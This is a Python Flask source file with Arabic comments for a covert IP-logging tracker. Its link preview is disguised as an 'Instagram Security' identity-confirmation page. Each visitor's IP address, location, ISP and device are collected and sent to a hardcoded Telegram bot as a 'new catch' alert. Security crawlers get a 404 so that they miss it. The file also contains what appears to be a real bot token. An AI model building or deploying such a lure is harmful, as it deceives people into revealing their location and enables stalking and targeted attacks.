from flask import Flask, request
import requests

app = Flask(__name__)

# التوكن والآيدي الخاص بك من الصور
TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQS0zvn6TFWMWuZR0r9cf_CUo"
CHAT_ID = "8524242091" 

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        # استخدام json=payload لضمان وصول الرسالة عبر Vercel
        requests.post(url, json=payload, timeout=10)
    except:
        pass

@app.route('/')
@app.route('/check-status')
@app.route('/photo.jpg')
def track():
    user_agent = request.headers.get('User-Agent', 'Unknown')
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    
    # --- التعديل الوحيد لتجاوز بوتات الحماية ---
    # هذه القائمة تمنع إزعاجك برسائل البوتات (Amazon, DigitalOcean, Facebook)
    bots = ['facebook', 'vercel', 'bot', 'amazon', 'digitalocean', 'cloud']
    if any(b in user_agent.lower() for b in bots):
        return "Not Found", 404

    try:
        geo_res = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5).json()
        location = f"{geo_res.get('city', 'Unknown')}, {geo_res.get('country', 'Unknown')}"
        isp = geo_res.get('isp', 'Unknown')
    except:
        location = isp = "Error Fetching Data"

    report = (
        f"🎯 <b>تنبيه صيد جديد!</b>\n"
        f"--------------------------\n"
        f"🌐 <b>IP:</b> <code>{ip_address}</code>\n"
        f"📍 <b>الموقع:</b> {location}\n"
        f"🏢 <b>المزود:</b> {isp}\n"
        f"📱 <b>الجهاز:</b> {user_agent}\n"
        f"--------------------------"
    )
    
    send_to_telegram(report)
    
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <meta property="og:title" content="Instagram Security">
        <meta property="og:description" content="Confirm your identity to continue.">
        <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/b306391458a7.png">
        <meta property="og:type" content="website">
    </head>
    <body><h1>404 Not Found</h1></body>
    </html>
    """, 200

if __name__ == '__main__':
    app.run()
